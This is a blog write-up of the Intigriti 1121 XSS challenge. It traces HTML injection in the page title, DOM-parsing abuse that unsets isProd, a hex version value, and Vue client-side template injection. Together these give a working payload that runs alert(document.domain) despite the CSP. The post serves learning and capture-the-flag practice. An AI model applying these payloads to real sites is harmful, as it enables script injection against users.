@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Challenge description
+Execute JS on the page
+https://challenge-1121.intigriti.io/challenge/index.php?s=
+HTML Injection
+https://challenge-1121.intigriti.io/challenge/index.php?s=&lt;h1&gt;sink&lt;/h1&gt;
+Inspector tab to see the current state of the rendered DOM
+
+When we right click on lines containing sink and Edit HTML, we HTML encoding being enforced
+&amp;lt;h1&amp;gt;sink&amp;lt;/h1&amp;gt;
+Try to close the title and p tag with ?s=&lt;/title&gt;&lt;h1&gt;sink&lt;/h1&gt;
+
+
+Note that HTML encoding is applied to the p tag context
+&lt;p&gt;You searched for &amp;lt;/title&amp;gt;&amp;lt;h1&amp;gt;sink&amp;lt;/h1&amp;gt;&lt;/p&gt;
+Try to close the p tag with ?s=&lt;/p&gt;&lt;h1&gt;sink&lt;/h1&gt; but there is no HTML injection as the tags are HTML encoded.">  
+
+  <title>
+    
+      1121 Owasp Top 10
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.d21e6a19ea346f458ada43307d36e23a3fc456016a2a0ff21dd4f28d1029b5bd96f94ff0aff3fb25ce909d6821efc877f876e44d01fbe1d2648cd5ff58f6c070.css" integrity="sha512-0h5qGeo0b0WK2kMwfTbiOj/EVgFqKg/yHdTyjRAptb2W&#43;U/wr/P7Jc6QnWgh78h3&#43;HbkTQH74dJkjNX/WPbAcA==" />
+  </head>
+<body a="light">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">&lt; back</a>
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2025-02-04 17:07:19 &#43;0800 &#43;08">
+            2025-02-04
+        </time>
+    </p>
+
+    <h1>1121 Owasp Top 10</h1>
+
+    
+
+    <h1 id="challenge-description">Challenge description</h1>
+<p>Execute JS on the page
+<a href="https://challenge-1121.intigriti.io/challenge/index.php?s=">https://challenge-1121.intigriti.io/challenge/index.php?s=</a></p>
+<h1 id="html-injection">HTML Injection</h1>
+<p><code>https://challenge-1121.intigriti.io/challenge/index.php?s=&lt;h1&gt;sink&lt;/h1&gt;</code></p>
+<p>Inspector tab to see the current state of the rendered DOM
+<img src="a.png" alt="a"></p>
+<p>When we right click on lines containing <code>sink</code> and Edit HTML, we HTML encoding being enforced</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#999;font-weight:bold">&amp;lt;</span>h1<span style="color:#999;font-weight:bold">&amp;gt;</span>sink<span style="color:#999;font-weight:bold">&amp;lt;</span>/h1<span style="color:#999;font-weight:bold">&amp;gt;</span>
+</span></span></code></pre></div><p>Try to close the <code>title</code> and <code>p</code> tag with <code>?s=&lt;/title&gt;&lt;h1&gt;sink&lt;/h1&gt;</code>
+<img src="b.png" alt="b">
+<img src="c.png" alt="c">
+Note that HTML encoding is applied to the <code>p</code> tag context</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">p</span>&gt;You searched for <span style="color:#999;font-weight:bold">&amp;lt;</span>/title<span style="color:#999;font-weight:bold">&amp;gt;&amp;lt;</span>h1<span style="color:#999;font-weight:bold">&amp;gt;</span>sink<span style="color:#999;font-weight:bold">&amp;lt;</span>/h1<span style="color:#999;font-weight:bold">&amp;gt;</span>&lt;/<span style="color:#309;font-weight:bold">p</span>&gt;
+</span></span></code></pre></div><p>Try to close the <code>p</code> tag with <code>?s=&lt;/p&gt;&lt;h1&gt;sink&lt;/h1&gt;</code> but there is no HTML injection as the tags are HTML encoded.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#999;font-weight:bold">&amp;lt;</span>/p<span style="color:#999;font-weight:bold">&amp;gt;&amp;lt;</span>h1<span style="color:#999;font-weight:bold">&amp;gt;</span>sink<span style="color:#999;font-weight:bold">&amp;lt;</span>/h1<span style="color:#999;font-weight:bold">&amp;gt;</span>
+</span></span></code></pre></div><h1 id="bypassing-csp">Bypassing CSP</h1>
+<p>As usual, Intigriti challenges are not so straightforward. We can try to inject <code>script</code> tags but execution is blocked because of CSP.</p>
+<p><code>?s=&lt;/title&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
+<p>CSP we are dealing with</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a00;background-color:#faa">content-security-policy: base-uri &#39;self&#39;; default-src &#39;self&#39;; script-src &#39;unsafe-eval&#39; &#39;nonce-3f9d2afa7be4382eab6af5ff2d269a&#39; &#39;strict-dynamic&#39;; object-src &#39;none&#39;; style-src &#39;sha256-dpZAgKnDDhzFfwKbmWwkl1IEwmNIKxUv+uw+QP89W3Q=&#39;
+</span></span></span></code></pre></div><p>Only scripts with valid nonce can be executed. There are a couple of scripts that have the valid nonce.</p>
+<p>Since the CSP is set by the response header, we can HTML inject a <code>meta</code> tag to override the DOM before it is rendered.</p>
+<p>In hindsight, the intended solution is to inject a stricter CSP via HTML injection, since the injection is at the head parameter. This will allow us to control what scripts we want to load based on <code>sha256</code> of the scripts. Then proceed to exploit script 4 but use <code>{{ }}</code> delimiter instead of the custom delimiter <code>v-{{ }}</code>.</p>
+<h1 id="inspecting-scripts">Inspecting scripts</h1>
+<h2 id="script-1">script 1</h2>
+<p>Script 1 sets a variable isProd to true.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">title</span>&gt;You searched for &#39;&lt;/<span style="color:#309;font-weight:bold">p</span>&gt;&lt;<span style="color:#309;font-weight:bold">script</span>&gt;alert(<span style="color:#366">document</span>.domain)&lt;/<span style="color:#309;font-weight:bold">script</span>&gt;&#39;&lt;/<span style="color:#309;font-weight:bold">title</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#309;font-weight:bold">script</span> <span style="color:#309">nonce</span><span style="color:#555">=</span><span style="color:#c30">&#34;3f9d2afa7be4382eab6af5ff2d269a&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">var</span> isProd <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">true</span>;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#309;font-weight:bold">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">head</span>&gt;
+</span></span></code></pre></div><h2 id="script-2">script 2</h2>
+<p>Script 2 seems to define a function that creates a script element and dynamically loads a JS script into the DOM.</p>
+<p>Another function definition that initialise a Vue instance for the <code>#app</code> element.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">script</span> <span style="color:#309">nonce</span><span style="color:#555">=</span><span style="color:#c30">&#34;3f9d2afa7be4382eab6af5ff2d269a&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">function</span> addJS(src, cb){
+</span></span><span style="display:flex;"><span>  	<span style="color:#069;font-weight:bold">let</span> s <span style="color:#555">=</span> <span style="color:#366">document</span>.createElement(<span style="color:#c30">&#39;script&#39;</span>);
+</span></span><span style="display:flex;"><span>  	s.src <span style="color:#555">=</span> src;
+</span></span><span style="display:flex;"><span>  	s.onload <span style="color:#555">=</span> cb;
+</span></span><span style="display:flex;"><span>  	<span style="color:#069;font-weight:bold">let</span> sf <span style="color:#555">=</span> <span style="color:#366">document</span>.getElementsByTagName(<span style="color:#c30">&#39;script&#39;</span>)[<span style="color:#f60">0</span>];
+</span></span><span style="display:flex;"><span>    			sf.parentNode.insertBefore(s, sf);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">function</span> initVUE(){
+</span></span><span style="display:flex;"><span>  	<span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">!</span><span style="color:#366">window</span>.Vue){
+</span></span><span style="display:flex;"><span>  		setTimeout(initVUE, <span style="color:#f60">100</span>);
+</span></span><span style="display:flex;"><span>  	}
+</span></span><span style="display:flex;"><span>  	<span style="color:#069;font-weight:bold">new</span> Vue({
+</span></span><span style="display:flex;"><span>  		el<span style="color:#555">:</span> <span style="color:#c30">&#39;#app&#39;</span>,
+</span></span><span style="display:flex;"><span>  		delimiters<span style="color:#555">:</span> <span style="color:#366">window</span>.delimiters,
+</span></span><span style="display:flex;"><span>  		data<span style="color:#555">:</span> {
+</span></span><span style="display:flex;"><span>  			<span style="color:#c30">&#34;owasp&#34;</span><span style="color:#555">:</span>[...].filter(e=&gt;{
+</span></span><span style="display:flex;"><span>  				<span style="color:#069;font-weight:bold">return</span> (e.title <span style="color:#555">+</span> <span style="color:#c30">&#39; - &#39;</span> <span style="color:#555">+</span> e.description)
+</span></span><span style="display:flex;"><span>  					.includes(<span style="color:#069;font-weight:bold">new</span> URL(location).searchParams.get(<span style="color:#c30">&#39;s&#39;</span>)<span style="color:#555">||</span> <span style="color:#c30">&#39; &#39;</span>);
+</span></span><span style="display:flex;"><span>  			}),
+</span></span><span style="display:flex;"><span>  		<span style="color:#c30">&#34;search&#34;</span><span style="color:#555">:</span> <span style="color:#069;font-weight:bold">new</span> URL(location).searchParams.get(<span style="color:#c30">&#39;s&#39;</span>)
+</span></span><span style="display:flex;"><span>  		}
+</span></span><span style="display:flex;"><span>  	})
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">script</span>&gt;
+</span></span></code></pre></div><h2 id="script-3">script 3</h2>
+<p>Script 3 calls the addJS function defined in script 2. The function call takes in client side resource <code>./vuejs.php</code> which was served by the server response. This supposed php file actually contains JS code instead.</p>
+<p>A variable delimiters is created. By default, Vue.js uses <code>{{ }}</code> for interpolating data in templates. For example, <code>{{ item.title }}</code>. But a custom delimiter can be use where Vue will interpret <code>v-{{ item.title }}</code> instead. Note that the <code>addJS</code> method takes in a callback function, in this case <code>initVUE</code>. This callback function is called after <code>./vuejs.php</code> is loaded.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">script</span> <span style="color:#309">nonce</span><span style="color:#555">=</span><span style="color:#c30">&#34;3f9d2afa7be4382eab6af5ff2d269a&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">var</span> delimiters <span style="color:#555">=</span> [<span style="color:#c30">&#34;v-{{&#34;</span>, <span style="color:#c30">&#34;}}&#34;</span>];
+</span></span><span style="display:flex;"><span>  addJS(<span style="color:#c30">&#34;./vuejs.php&#34;</span>, initVUE);
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">script</span>&gt;
+</span></span></code></pre></div><p>When <code>initVUE</code> is called, a new VUE instance is created with the delimiter defined in <code>window.delimiters</code>. In this case, it is <code>v-{{ }}</code> from the script above.</p>
+<h2 id="script-4">script 4</h2>
+<p>Script 4 only runs if the <code>isProd</code> is not true. However, by default it is set to true in script 1. If not true, it will retrieve the <code>version</code> query parameter and limit the value to 12 characters. Another query parameter <code>vueDevtools</code> will be retrieved and its value will be sanitized to remove any non-alphanumeric characters and <code>% . /</code> and then any multiple leading slashes <code>//, ///, etc</code>.</p>
+<p>Finally, if version is 999999999999, then <code>window.legacyLogger</code> will be called after 1 second delay. This isn&rsquo;t so interesting but may be a good gadget to help us know if we are actually able to control <code>version</code>.</p>
+<p>If the version is greater than 1000000000000, then <code>addJS(vueDevtools, window.initVUE)</code> will be called. This is more interesting if we can get <code>isProd</code> to false and control <code>vueDevtools</code> to point to a JS script that we control so that it will be loaded by script 4.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">script</span> <span style="color:#309">nonce</span><span style="color:#555">=</span><span style="color:#c30">&#34;3f9d2afa7be4382eab6af5ff2d269a&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">!</span><span style="color:#366">window</span>.isProd) {
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">let</span> version <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> URL(location).searchParams.get(<span style="color:#c30">&#34;version&#34;</span>) <span style="color:#555">||</span> <span style="color:#c30">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    version <span style="color:#555">=</span> version.slice(<span style="color:#f60">0</span>, <span style="color:#f60">12</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">let</span> vueDevtools <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> URL(location).searchParams.get(<span style="color:#c30">&#34;vueDevtools&#34;</span>) <span style="color:#555">||</span> <span style="color:#c30">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    vueDevtools <span style="color:#555">=</span> vueDevtools
+</span></span><span style="display:flex;"><span>      .replace(<span style="color:#3aa">/[^0-9%a-z/.]/gi</span>, <span style="color:#c30">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>      .replace(<span style="color:#3aa">/^\/\/+/</span>, <span style="color:#c30">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (version <span style="color:#555">===</span> <span style="color:#f60">999999999999</span>) {
+</span></span><span style="display:flex;"><span>      setTimeout(<span style="color:#366">window</span>.legacyLogger, <span style="color:#f60">1000</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#069;font-weight:bold">else</span> <span style="color:#069;font-weight:bold">if</span> (version <span style="color:#555">&gt;</span> <span style="color:#f60">1000000000000</span>) {
+</span></span><span style="display:flex;"><span>      addJS(vueDevtools, <span style="color:#366">window</span>.initVUE);
+</span></span><span style="display:flex;"><span>    } <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>      console.log(performance);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">script</span>&gt;
+</span></span></code></pre></div><h1 id="abusing-dom-parsing">Abusing DOM parsing</h1>
+<p>When we view source for the page without any user input to <code>s</code> query parameter, we see that the <code>title</code> tag is directly above the <code>script</code> tag that creates the variable <code>isProd = true</code></p>
+<p><code>view-source:https://challenge-1121.intigriti.io/challenge/index.php?s=</code>
+<img src="d.png" alt="d"></p>
+<p>We can inspect the console</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>isProd;
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// true
+</span></span></span></code></pre></div><p>Since we can perform HTML injection to the <code>title</code> tag, we can abuse DOM parsing to make the script 1 to not properly load in the DOM.</p>
+<p>We can simply include an open <code>script</code> tag into our payload <code>?s=&lt;/title&gt;&lt;script&gt;</code>.</p>
+<p><img src="e.png" alt="e"></p>
+<p>Inspect the console on the page to see if isProd is defined</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>isProd;
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// ReferenceError: isProd is not defined
+</span></span></span></code></pre></div><h2 id="accessing-more-query-parameters-for-attack-vector">Accessing more query parameters for attack vector</h2>
+<p>Remember that in script 4, if <code>isProd</code> is not true, it will use the values in <code>version</code> and <code>vueDevtools</code> query parameters.</p>
+<p>Just for recap, here is script 4.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#309;font-weight:bold">script</span> <span style="color:#309">nonce</span><span style="color:#555">=</span><span style="color:#c30">&#34;3f9d2afa7be4382eab6af5ff2d269a&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">!</span><span style="color:#366">window</span>.isProd) {
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">let</span> version <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> URL(location).searchParams.get(<span style="color:#c30">&#34;version&#34;</span>) <span style="color:#555">||</span> <span style="color:#c30">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    version <span style="color:#555">=</span> version.slice(<span style="color:#f60">0</span>, <span style="color:#f60">12</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">let</span> vueDevtools <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> URL(location).searchParams.get(<span style="color:#c30">&#34;vueDevtools&#34;</span>) <span style="color:#555">||</span> <span style="color:#c30">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    vueDevtools <span style="color:#555">=</span> vueDevtools
+</span></span><span style="display:flex;"><span>      .replace(<span style="color:#3aa">/[^0-9%a-z/.]/gi</span>, <span style="color:#c30">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>      .replace(<span style="color:#3aa">/^\/\/+/</span>, <span style="color:#c30">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (version <span style="color:#555">===</span> <span style="color:#f60">999999999999</span>) {
+</span></span><span style="display:flex;"><span>      setTimeout(<span style="color:#366">window</span>.legacyLogger, <span style="color:#f60">1000</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#069;font-weight:bold">else</span> <span style="color:#069;font-weight:bold">if</span> (version <span style="color:#555">&gt;</span> <span style="color:#f60">1000000000000</span>) {
+</span></span><span style="display:flex;"><span>      addJS(vueDevtools, <span style="color:#366">window</span>.initVUE);
+</span></span><span style="display:flex;"><span>    } <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>      console.log(performance);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#309;font-weight:bold">script</span>&gt;
+</span></span></code></pre></div><p>We want to be able to use <code>vueDevtools</code>, hence our version should be greater than 1000000000000. However, 1000000000000 has 13 characters which is greater than the 12 characters being sliced from <code>version = version.slice(0,12)</code>.</p>
+<p>In Javascript, there are different ways to represent a number. This may shorten the number of characters needed.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">let</span> version <span style="color:#555">=</span> <span style="color:#f60">1000000000001</span>;
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Convert to hexadecimal
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#366">Number</span>(version).toString(<span style="color:#f60">16</span>);
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// e8d4a51001
+</span></span></span></code></pre></div><p>Use <code>0x</code> prefix in the version query parameter.</p>
+<p>When the version is not 999999999999 or greater than 1000000000000, we should see the <code>console.log(performance)</code>. For example with <code>?s=&lt;/title&gt;&lt;script&gt;&amp;version=1</code></p>
+<p><img src="f.png" alt="f"></p>
+<p>Now with version greater than 1000000000000 - <code>?s=&lt;/title&gt;&lt;script&gt;&amp;version=0xe8d4a51001</code>, we will not see the performance being logged and we will see <code>src</code> attribute is empty due to <code>vueDevtools</code> not being defined.</p>
+<p><img src="g.png" alt="g"></p>
+<p>Now, lets try and get script 4 to load our JS script instead of <code>/vuejs.php</code>. Note that because of the regex in place for <code>vueDevtools</code>, we are not able to define our usual URL format <code>https://attacker.com/evil.js</code> as <code>:</code> will be removed.</p>
+<p>It is worth checking if we really need a URI or just a JS script source. Below is script 2 where the <code>addJS</code> function is defined.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> addJS(src, cb) {
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">let</span> s <span style="color:#555">=</span> <span style="color:#366">document</span>.createElement(<span style="color:#c30">&#34;script&#34;</span>);
+</span></span><span style="display:flex;"><span>  s.src <span style="color:#555">=</span> src;
+</span></span><span style="display:flex;"><span>  s.onload <span style="color:#555">=</span> cb; <span style="color:#09f;font-style:italic">// initVue() which create a template app
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>  <span style="color:#069;font-weight:bold">let</span> sf <span style="color:#555">=</span> <span style="color:#366">document</span>.getElementsByTagName(<span style="color:#c30">&#34;script&#34;</span>)[<span style="color:#f60">0</span>];
+</span></span><span style="display:flex;"><span>  sf.parentNode.insertBefore(s, sf);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We may not be able to do much in controlling what source will be loaded by <code>addJS</code>. However, with <code>?s=&lt;/title&gt;&lt;script&gt;&amp;version=0xe8d4a51001&amp;vueDevtools=invalid</code>, we are able to control the JS loaded by <code>addJS</code> in script 4.</p>
+<p><img src="h.png" alt="h"></p>
+<p>Note that script 3 already loads the vuejs.php which will cause the page to &lsquo;hydrate&rsquo; the template at the client side (<code>&lt;div id=&quot;app&quot;&gt;</code>) when Vue app is created.</p>
+<p>What if we put vueDevtools=./vuejs.php?
+<img src="i.png" alt="i">
+We will see that in the network tab, the vuejs.php is requested twice, first from script 3 and next from script 4.</p>
+<h2 id="csti-to-xss">CSTI to XSS</h2>
+<p>If we use <code>?s=v-{{7*7}}</code> to inject a template string to the DOM for Vue to evaluate, no evaluation will happen.</p>
+<p><img src="j.png" alt="j">
+<img src="k.png" alt="k">
+This is strange as we would expect that Vue will evaluate the template string in the rendered DOM.</p>
+<p>When I set breakpoint and step through after Vue is created in script 3, and dump the innerHTML of the DOM in the Vue template, we will see the DOM having <code>You searched for v-{{7*7}}</code></p>
+<p><img src="l.png" alt="l">
+After stepping over line 46, we check the current state of the DOM. The DOM hasn&rsquo;t completely parsed the <code>&lt;div id&quot;app&quot;&gt;</code> element yet since it is at the below script 3.
+<img src="m.png" alt="m"></p>
+<p>We only see the element loaded onto the DOM once the remaining scripts (script 4) in the <code>head</code> tag have finished loading.</p>
+<p><img src="n.png" alt="n">
+<img src="o.png" alt="o"></p>
+<p>But when we exploit script 4 which creates the Vue app again along with loading vuejs.php, we get a different result. This time, our template injection works. I tried to debug this behaviour but couldn&rsquo;t come to a conclusive reason of why loading vuejs.php twice will induce the CSTI. I added another section below for the analysis of the template evaluation and my suspicion.</p>
+<p><code>?s=v-{{7*7}}&lt;/title&gt;&lt;script&gt;&amp;version=0xe8d4a51001&amp;vueDevtools=./vuejs.php</code></p>
+<p><img src="p.png" alt="p"></p>
+<p>Anyway, similar to SSTI, we can execute Javascript like this</p>
+<p><code>{{constructor.constructor('alert(document.domain)')()}}</code>
+Hence the final payload will be
+<code>?s={{constructor.constructor('alert(document.domain)')()}}&lt;/title&gt;&lt;script&gt;&amp;version=0xe8d4a51001&amp;vueDevtools=./vuejs.php</code></p>
+<p><img src="q.png" alt="q"></p>
+<p><a href="https://book.hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti.html#v2">https://book.hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti.html#v2</a></p>
+<h2 id="analysis-of-template-evaluation">Analysis of template evaluation</h2>
+<p>Payload: <code>?s=v-{{7*7}}&lt;/title&gt;&lt;script&gt;&amp;version=0xe8d4a51001&amp;vueDevtools=./vuejs.php</code></p>
+<p>Set another breakpoint at script 4
+<img src="r.png" alt="r"></p>
+<p>Set breakpoint in vuejs.php and click play until you hit the part where Vue processes our injected <code>v-{{7*7}}</code>.</p>
+<p><img src="s.png" alt="s"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// L9377 - text = You searched for v-{{7*7}}&lt;/title&gt;&lt;script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">while</span>(match <span style="color:#555">=</span> tagRE.exec(text));
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// L9385 - match[1] = &#34;7*7&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">var</span> exp <span style="color:#555">=</span> parseFilters(match[<span style="color:#f60">1</span>],trim());
+</span></span></code></pre></div><p><img src="t.png" alt="t"></p>
+<p>Here we are able to see the expression detected during the second addJS by exploiting script 4. If we didn&rsquo;t exploit script 4 and just use the following payload, <code>?s=v-{{7*7}}</code>, then the expression will not even be detected during the addJS call in script 3.</p>
+<p>I suspect this is something to do with how Vue is initialized in respect to when the Vue template in the DOM is visible to Vue. It seems like during the first addJS, the <code>v-{{7*7}}</code> is not visible by Vue, hence no CSTI.</p>
+
+</article>
+
+                
+    
+    
+        Nicholas Ch • © 2025
+    
+
+
+            </div>
+        </main>
+    </body>
+</html>
